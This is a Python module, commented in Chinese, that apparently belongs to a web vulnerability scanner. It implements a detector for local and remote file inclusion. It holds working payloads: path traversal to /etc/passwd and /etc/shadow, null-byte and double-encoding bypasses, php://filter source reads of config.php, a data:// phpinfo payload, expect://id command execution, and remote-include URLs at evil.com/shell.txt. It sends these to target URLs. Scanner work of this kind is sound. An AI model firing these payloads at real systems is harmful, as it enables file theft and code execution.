"""
LFI/RFI 检测器

检测本地文件包含 (LFI)、远程文件包含 (RFI) 和 PHP 伪协议利用漏洞
"""

import re
import logging
from typing import List, Optional, Dict, Any
from urllib.parse import quote

from ..base import BaseDetector
from ..result import DetectionResult, Severity, DetectorType
from ..factory import register_detector
from ..payloads import get_payloads, PayloadCategory

logger = logging.getLogger(__name__)


@register_detector('lfi')
class LFIDetector(BaseDetector):
    """LFI/RFI 文件包含检测器

    检测类型:
    - 本地文件包含 (LFI)
    - 远程文件包含 (RFI)
    - PHP 伪协议利用 (php://filter, php://input, data://, expect://)
    - 路径遍历

    使用示例:
        detector = LFIDetector()
        results = detector.detect("https://example.com", params={"file": "index.php"})
    """

    name = 'lfi'
    description = 'LFI/RFI文件包含漏洞检测器'
    vuln_type = 'lfi'
    severity = Severity.CRITICAL
    detector_type = DetectorType.ACCESS
    version = '1.0.0'

    # 覆盖默认测试参数
    FILE_PARAMS = [
        "file", "page", "include", "path", "doc", "document",
        "folder", "root", "pg", "style", "template", "php_path",
        "lang", "language", "dir", "load", "read", "content"
    ]

    # LFI Payload (payload, indicator, os_type)
    LFI_PAYLOADS = [
        # Linux 路径遍历
        ("../../../etc/passwd", "root:", "linux"),
        ("....//....//....//etc/passwd", "root:", "linux"),
        ("..%2f..%2f..%2fetc/passwd", "root:", "linux"),
        ("..%252f..%252f..%252fetc/passwd", "root:", "linux"),
        ("/etc/passwd", "root:", "linux"),
        ("../../../etc/shadow", "root:", "linux"),
        ("../../../etc/hosts", "localhost", "linux"),
        # Windows 路径遍历
        ("....\\....\\....\\windows\\win.ini", "[fonts]", "windows"),
        ("..\\..\\..\\windows\\win.ini", "[fonts]", "windows"),
        ("..%5c..%5c..%5cwindows%5cwin.ini", "[fonts]", "windows"),
        ("C:\\windows\\win.ini", "[fonts]", "windows"),
        ("C:/windows/win.ini", "[fonts]", "windows"),
        # Null 字节绕过 (PHP < 5.3.4)
        ("../../../etc/passwd%00", "root:", "linux"),
        ("../../../etc/passwd\x00.jpg", "root:", "linux"),
        # 双重编码
        ("..%252f..%252f..%252fetc%252fpasswd", "root:", "linux"),
    ]

    # PHP 伪协议 Payload
    PHP_WRAPPER_PAYLOADS = [
        # php://filter - 读取源码
        ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA", "php://filter"),
        ("php://filter/read=string.rot13/resource=index.php", "<?cuc", "php://filter"),
        ("php://filter/convert.base64-encode/resource=config.php", "PD9waHA", "php://filter"),
        ("php://filter/convert.base64-encode/resource=../config.php", "PD9waHA", "php://filter"),
        # data:// - 数据流
        ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "phpinfo", "data://"),
        # expect:// - 命令执行 (需要 expect 扩展)
        ("expect://id", "uid=", "expect://"),
    ]

    # RFI Payload
    RFI_PAYLOADS = [
        "http://evil.com/shell.txt",
        "https://evil.com/shell.txt",
        "//evil.com/shell.txt",
        "http://127.0.0.1:8080/shell.txt",
    ]

    # 成功指示器
    LINUX_INDICATORS = [
        "root:", "daemon:", "bin:", "nobody:",
        "/bin/bash", "/bin/sh", "/usr/sbin/nologin",
    ]

    WINDOWS_INDICATORS = [
        "[fonts]", "[extensions]", "for 16-bit app support",
        "[mci extensions]", "[files]",
    ]

    # 错误指示器 (可能表明存在漏洞)
    ERROR_INDICATORS = [
        "failed to open stream",
        "no such file or directory",
        "include_path",
        "failed opening",
        "warning: include",
        "warning: require",
        "fatal error",
        "fopen(",
        "file_get_contents(",
    ]

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """初始化检测器

        Args:
            config: 配置选项
                - deep_scan: 是否深度扫描 (包含 PHP 伪协议和 RFI 检测)
                - max_params: 最大测试参数数量
        """
        super().__init__(config)

        # 加载 payload
        try:
            self.payloads = self._enhance_payloads(
                get_payloads(PayloadCategory.LFI)
            )
        except Exception:
            # 如果 PayloadCategory.LFI 不存在,使用内置 payloads
            logger.debug(f"[{self.name}] 使用内置 LFI payloads")
            self.payloads = [p[0] for p in self.LFI_PAYLOADS]

        # 配置
        self.deep_scan = self.config.get('deep_scan', True)
        self.max_params = self.config.get('max_params', 5)

    def detect(self, url: str, **kwargs) -> List[DetectionResult]:
        """检测 LFI/RFI 漏洞

        Args:
            url: 目标 URL
            **kwargs:
                params: GET 参数字典
                data: POST 数据字典
                method: HTTP 方法
                headers: 请求头
                deep_scan: 是否深度扫描 (覆盖配置)

        Returns:
            检测结果列表
        """
        self._log_detection_start(url)
        results: List[DetectionResult] = []

        params = kwargs.get('params', {})
        deep_scan = kwargs.get('deep_scan', self.deep_scan)

        # 识别可能的文件参数
        test_params = self._identify_file_params(params)

        # 1. 本地文件包含检测
        lfi_results = self._detect_lfi(url, test_params, kwargs)
        results.extend(lfi_results)

        if deep_scan:
            # 2. PHP 伪协议检测
            wrapper_results = self._detect_php_wrapper(url, test_params, kwargs)
            results.extend(wrapper_results)

            # 3. 远程文件包含检测
            rfi_results = self._detect_rfi(url, test_params, kwargs)
            results.extend(rfi_results)

            # 4. 错误检测 (仅当未发现确定漏洞时)
            if not lfi_results and not wrapper_results and not rfi_results:
                error_results = self._detect_error_based(url, test_params, kwargs)
                results.extend(error_results)

        self._log_detection_end(url, results)
        return results

    def _identify_file_params(self, params: Dict[str, str]) -> List[str]:
        """识别可能的文件参数

        Args:
            params: 参数字典

        Returns:
            文件参数名列表
        """
        file_params = []

        for param_name, value in params.items():
            param_lower = param_name.lower()

            # 检查参数名
            if any(fp in param_lower for fp in self.FILE_PARAMS):
                file_params.append(param_name)
                continue

            # 检查值是否像文件路径
            if self._looks_like_file_path(value):
                file_params.append(param_name)

        # 如果没有识别出参数,使用默认列表
        if not file_params:
            file_params = self.FILE_PARAMS[:self.max_params]

        return file_params[:self.max_params]

    def _looks_like_file_path(self, value: str) -> bool:
        """判断值是否像文件路径"""
        if not value:
            return False

        # 包含路径分隔符
        if '/' in value or '\\' in value:
            return True

        # 包含文件扩展名
        if re.search(r'\.[a-z]{2,4}$', value.lower()):
            return True

        return False

    def _detect_lfi(
        self,
        url: str,
        test_params: List[str],
        kwargs: Dict[str, Any]
    ) -> List[DetectionResult]:
        """检测本地文件包含"""
        results = []
        method = kwargs.get('method', 'GET').upper()
        headers = kwargs.get('headers', {})

        for param_name in test_params:
            for payload, indicator, os_type in self.LFI_PAYLOADS:
                encoded_payload = quote(payload, safe='')

                # 构建测试参数
                test_params_dict = {param_name: encoded_payload}

                try:
                    if method == 'GET':
                        response = self.http_client.get(url, params=test_params_dict, headers=headers)
                    else:
                        response = self.http_client.post(url, data=test_params_dict, headers=headers)

                    if not response:
                        continue

                    resp_text = getattr(response, 'text', '')

                    # 检查指示器
                    if indicator in resp_text:
                        request_info = self._build_request_info(
                            method=method,
                            url=url,
                            headers=headers,
                            params=test_params_dict if method == 'GET' else None,
                            data=test_params_dict if method != 'GET' else None
                        )
                        response_info = self._build_response_info(response)

                        result = self._create_result(
                            url=url,
                            vulnerable=True,
                            param=param_name,
                            payload=payload,
                            evidence=f"检测到 {os_type} 文件内容: {indicator}",
                            confidence=0.95,
                            verified=True,
                            request=request_info,
                            response=response_info,
                            remediation="使用白名单验证文件路径,避免直接使用用户输入构造文件路径",
                            references=[
                                "https://owasp.org/www-community/attacks/Path_Traversal",
                                "https://portswigger.net/web-security/file-path-traversal"
                            ],
                            extra={
                                'os_type': os_type,
                                'indicator': indicator,
                                'vuln_subtype': 'LFI'
                            }
                        )
                        results.append(result)
                        break  # 找到一个就停止该参数的测试

                except Exception as e:
                    logger.debug(f"[{self.name}] LFI 检测失败 {param_name}: {e}")

        return results

    def _detect_php_wrapper(
        self,
        url: str,
        test_params: List[str],
        kwargs: Dict[str, Any]
    ) -> List[DetectionResult]:
        """检测 PHP 伪协议利用"""
        results = []
        method = kwargs.get('method', 'GET').upper()
        headers = kwargs.get('headers', {})

        for param_name in test_params:
            for payload, indicator, wrapper_type in self.PHP_WRAPPER_PAYLOADS:
                encoded_payload = quote(payload, safe='')
                test_params_dict = {param_name: encoded_payload}

                try:
                    if method == 'GET':
                        response = self.http_client.get(url, params=test_params_dict, headers=headers)
                    else:
                        response = self.http_client.post(url, data=test_params_dict, headers=headers)

                    if not response:
                        continue

                    resp_text = getattr(response, 'text', '')

                    if indicator in resp_text:
                        request_info = self._build_request_info(
                            method=method,
                            url=url,
                            headers=headers,
                            params=test_params_dict if method == 'GET' else None,
                            data=test_params_dict if method != 'GET' else None
                        )
                        response_info = self._build_response_info(response)

                        result = self._create_result(
                            url=url,
                            vulnerable=True,
                            param=param_name,
                            payload=payload,
                            evidence=f"PHP 伪协议利用成功: {wrapper_type}",
                            confidence=0.9,
                            verified=True,
                            request=request_info,
                            response=response_info,
                            remediation="禁用危险的 PHP 伪协议,使用白名单验证输入",
                            references=[
                                "https://www.php.net/manual/en/wrappers.php",
                                "https://owasp.org/www-community/attacks/File_Inclusion"
                            ],
                            extra={
                                'wrapper_type': wrapper_type,
                                'indicator': indicator,
                                'vuln_subtype': 'PHP_WRAPPER'
                            }
                        )
                        results.append(result)
                        break

                except Exception as e:
                    logger.debug(f"[{self.name}] PHP Wrapper 检测失败 {param_name}: {e}")

        return results

    def _detect_rfi(
        self,
        url: str,
        test_params: List[str],
        kwargs: Dict[str, Any]
    ) -> List[DetectionResult]:
        """检测远程文件包含"""
        results = []
        method = kwargs.get('method', 'GET').upper()
        headers = kwargs.get('headers', {})

        for param_name in test_params:
            for payload in self.RFI_PAYLOADS:
                encoded_payload = quote(payload, safe='')
                test_params_dict = {param_name: encoded_payload}

                try:
                    if method == 'GET':
                        response = self.http_client.get(url, params=test_params_dict, headers=headers)
                    else:
                        response = self.http_client.post(url, data=test_params_dict, headers=headers)

                    if not response:
                        continue

                    resp_text = getattr(response, 'text', '').lower()

                    # 检查 RFI 指示器
                    rfi_indicators = [
                        ("evil.com", 0.9, Severity.CRITICAL, "RFI"),
                        ("failed to open stream", 0.7, Severity.HIGH, "Potential RFI"),
                        ("allow_url_include", 0.7, Severity.HIGH, "Potential RFI"),
                        ("allow_url_fopen", 0.7, Severity.HIGH, "Potential RFI"),
                    ]

                    for indicator, confidence, severity, vuln_subtype in rfi_indicators:
                        if indicator in resp_text:
                            request_info = self._build_request_info(
                                method=method,
                                url=url,
                                headers=headers,
                                params=test_params_dict if method == 'GET' else None,
                                data=test_params_dict if method != 'GET' else None
                            )
                            response_info = self._build_response_info(response)

                            result = DetectionResult(
                                vulnerable=True,
                                vuln_type=self.vuln_type,
                                severity=severity,
                                url=url,
                                param=param_name,
                                payload=payload,
                                evidence=f"RFI 指示器: {indicator}",
                                confidence=confidence,
                                verified=(confidence >= 0.9),
                                detector=self.name,
                                detector_version=self.version,
                                request=request_info,
                                response=response_info,
                                remediation="禁用 allow_url_include 和 allow_url_fopen,使用白名单验证输入",
                                references=[
                                    "https://owasp.org/www-community/attacks/File_Inclusion"
                                ],
                                extra={
                                    'indicator': indicator,
                                    'vuln_subtype': vuln_subtype
                                }
                            )
                            results.append(result)
                            break

                except Exception as e:
                    logger.debug(f"[{self.name}] RFI 检测失败 {param_name}: {e}")

        return results

    def _detect_error_based(
        self,
        url: str,
        test_params: List[str],
        kwargs: Dict[str, Any]
    ) -> List[DetectionResult]:
        """检测基于错误的文件包含 (可能存在漏洞)"""
        results = []
        method = kwargs.get('method', 'GET').upper()
        headers = kwargs.get('headers', {})

        # 使用可能触发错误的 Payload
        error_payloads = [
            "../../../nonexistent_file_12345",
            "/etc/nonexistent_12345",
            "C:\\nonexistent_12345",
        ]

        for param_name in test_params:
            for payload in error_payloads:
                encoded_payload = quote(payload, safe='')
                test_params_dict = {param_name: encoded_payload}

                try:
                    if method == 'GET':
                        response = self.http_client.get(url, params=test_params_dict, headers=headers)
                    else:
                        response = self.http_client.post(url, data=test_params_dict, headers=headers)

                    if not response:
                        continue

                    resp_text = getattr(response, 'text', '').lower()

                    # 检查错误指示器
                    for indicator in self.ERROR_INDICATORS:
                        if indicator in resp_text:
                            request_info = self._build_request_info(
                                method=method,
                                url=url,
                                headers=headers,
                                params=test_params_dict if method == 'GET' else None,
                                data=test_params_dict if method != 'GET' else None
                            )
                            response_info = self._build_response_info(response)

                            result = DetectionResult(
                                vulnerable=True,
                                vuln_type=self.vuln_type,
                                severity=Severity.MEDIUM,
                                url=url,
                                param=param_name,
                                payload=payload,
                                evidence=f"文件操作错误信息: {indicator}",
                                confidence=0.5,
                                verified=False,
                                detector=self.name,
                                detector_version=self.version,
                                request=request_info,
                                response=response_info,
                                remediation="验证和清理用户输入,使用白名单",
                                references=[
                                    "https://owasp.org/www-community/attacks/File_Inclusion"
                                ],
                                extra={
                                    'indicator': indicator,
                                    'vuln_subtype': 'ERROR_BASED'
                                }
                            )
                            results.append(result)
                            break

                except Exception as e:
                    logger.debug(f"[{self.name}] 错误检测失败 {param_name}: {e}")

        return results

    def get_payloads(self) -> List[str]:
        """获取检测器使用的 payload 列表"""
        payloads = [p[0] for p in self.LFI_PAYLOADS]
        payloads.extend([p[0] for p in self.PHP_WRAPPER_PAYLOADS])
        payloads.extend(self.RFI_PAYLOADS)
        return payloads
